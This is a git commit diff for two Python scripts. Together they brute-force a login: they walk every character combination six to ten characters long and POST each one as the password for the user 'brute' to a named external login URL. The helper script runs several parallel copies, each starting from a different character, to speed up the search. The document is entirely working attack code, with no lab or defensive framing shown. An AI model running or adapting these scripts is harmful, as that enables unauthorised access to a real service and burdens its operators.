928ce400384b23ace78974cac21f5916a035dc4d
KrisHD1337 <kriscerni@gmail.com>
2025-10-22 15:51:34 +0200

    Optimized the script to run slightly better

--- multi_instances.py
+++ multi_instances.py
@@ -1,8 +1,21 @@
-import os, string
+import string
+import subprocess
+import sys
+from multiprocessing import Process
 
-instances = int(input("Number of instances:"))
-chars = string.ascii_letters + string.digits + string.punctuation
+def run_instance(start_char):
+    subprocess.Popen([sys.executable, "script.py", start_char],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-for i in range(instances):
-    start_char = chars[i]
-    os.system(f'start cmd /k "python script.py {start_char}"')
+if __name__ == "__main__":
+    instances = int(input("Number of instances: "))
+    chars = string.ascii_letters + string.digits + string.punctuation
+    if instances == 1:
+        skip = 1
+    else:
+        skip = 92 // (instances - 1)
+
+    for i in range(instances):
+        index = round(i * skip)
+        start_char = chars[index]
+        Process(target=run_instance, args=(start_char,)).start()
--- script.py
+++ script.py
@@ -2,21 +2,19 @@ import itertools
 import os
 import string
 import sys
-from asyncio import as_completed
-from concurrent.futures.thread import ThreadPoolExecutor
 
 import requests
 
 
-def main(start_char):
+def main():
+    start_char = sys.argv[1]
     password_length = 10
     min_length = 6
-    status = 400
     chars = string.ascii_letters + string.digits + string.punctuation
     index = chars.index(start_char)
     rotated = chars[index:] + chars[:index]
 
-    while status != 200:
+    while True:
         for length in range(min_length - 1, password_length):
             for first_char in rotated:
                 for rest in itertools.product(chars, repeat=length):
@@ -27,7 +25,8 @@ def main(start_char):
                                 "username": "brute",
                                 "password": combination,
                             }
-                            response = requests.post("https://fretux.ch/socket/login", json=payload, timeout=5)
+                            session = requests.Session()
+                            response = session.post("https://fretux.ch/socket/login", json=payload, timeout=5)
                             print(combination, response.status_code)
                             if response.ok:
                                 print(combination)
@@ -42,4 +41,4 @@ def main(start_char):
 
 
 if __name__ == "__main__":
-    main(sys.argv[1])
+    main()
